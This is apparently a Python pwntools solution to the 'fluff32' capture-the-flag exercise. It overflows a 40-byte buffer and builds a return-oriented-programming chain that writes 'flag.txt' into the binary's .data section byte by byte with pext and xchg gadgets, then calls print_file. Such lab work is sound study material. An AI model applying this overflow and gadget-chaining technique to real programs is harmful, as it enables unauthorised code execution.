
from pwn import *
from pprint import pprint
offset = 40

context.arch = 'i386'

elf = ELF("./fluff32")
p = elf.process()

# uncomment to debug:
#   gdb.attach(p, gdbscript='''
#   # script
#   ''')


rop = ROP(elf)

p.recvuntil(b">")


# address of gadgets we'll use/return to 
xchg_ecx_dl = p32(elf.symbols["questionableGadgets"]  + 18)
pext_rop_gadget = p32(elf.symbols["questionableGadgets"])
pop_ecx_xchg = p32(elf.symbols["questionableGadgets"] + 21)
pop_ebp_gadget = p32(rop.ebp.address)
   

# use rop object to locate gadgets in memory
rop = ROP(elf)

# buffer is 40 A's
buf = b"A"*offset

ebp_mask_for_l = b"\xdd\x06\x00\x00"
ebp_mask_for_f = b"\x4B\x4B\x00\x00"
ebp_mask_for_a = b"\x46\x5d\x00\x00"
ebp_mask_for_g = b"\x5a\x4b\x00\x00"
ebp_mask_for_dot = b"\xdb\x05\x00\x00"
ebp_mask_for_t = b"\xcd\x4a\x00\x00"
ebp_mask_for_x = b"\xc5\x5a\x00\x00"


# get address of .data section header. This is a writeable section of memory
# where we can write "flag.txt"
# once it is written to this address in memory, we'll be able to pass it into the print_file fxn
data_header_address = p32(elf.symbols["data_start"])    
data_header_address_big_endian = p32(elf.symbols["data_start"], endian='big')

data_header_char_1 = data_header_address_big_endian 
data_header_char_2 = p32(elf.symbols["data_start"] + 1, endian='big')
data_header_char_3 = p32(elf.symbols["data_start"] + 2, endian='big')
data_header_char_4 = p32(elf.symbols["data_start"] + 3, endian='big')
data_header_char_5 = p32(elf.symbols["data_start"] + 4, endian='big')
data_header_char_6 = p32(elf.symbols["data_start"] + 5, endian='big')
data_header_char_7 = p32(elf.symbols["data_start"] + 6, endian='big')
data_header_char_8 = p32(elf.symbols["data_start"] + 7, endian='big')

print_file_fxn_addr = p32(elf.symbols["print_file"])

payload = [
        buf,                                # bunch of A's
        ebp_mask_for_f,                     # 0x4b4b masked with 0xb0bababa = 0x66 = "f"
        pext_rop_gadget,                    # address of our "pext" ROP gadget
        pop_ecx_xchg,                       # addr of ROP gadget to pop ecx, and flip it's endian-ness
        data_header_address_big_endian,     # address of data header in big endian...
                                            # this is a region of writeable memory that we can store 
                                            # our string "flag.txt" in
        xchg_ecx_dl,                        # addr of ROP gadget to put dl into [ecx]


        # insert the "l"
        pop_ebp_gadget,
        ebp_mask_for_l,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_2,
        xchg_ecx_dl,

        # insert the "a"
        pop_ebp_gadget,
        ebp_mask_for_a,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_3,
        xchg_ecx_dl,
        
        # insert the "g"
        pop_ebp_gadget,
        ebp_mask_for_g,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_4,
        xchg_ecx_dl,

        # insert the "."
        pop_ebp_gadget,
        ebp_mask_for_dot,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_5,
        xchg_ecx_dl,

        # insert the "t"
        pop_ebp_gadget,
        ebp_mask_for_t,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_6,
        xchg_ecx_dl,

        # insert the "x"
        pop_ebp_gadget,
        ebp_mask_for_x,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_7,
        xchg_ecx_dl,

        # insert the "t"
        pop_ebp_gadget,
        ebp_mask_for_t,
        pext_rop_gadget,
        pop_ecx_xchg,
        data_header_char_8,
        xchg_ecx_dl,


        # open "flag.txt"
        print_file_fxn_addr,                # address of print_file function, which works like "cat"...
                                            # opens file that you pass to it as an argument

        b"cccc",                            # fake ebp

        data_header_address                 # address of "flag.txt", which acts as our argument to the 
                                            # print_file function
        ]

payload = b"".join(payload)

p.send(payload)

p.interactive()
p.close()

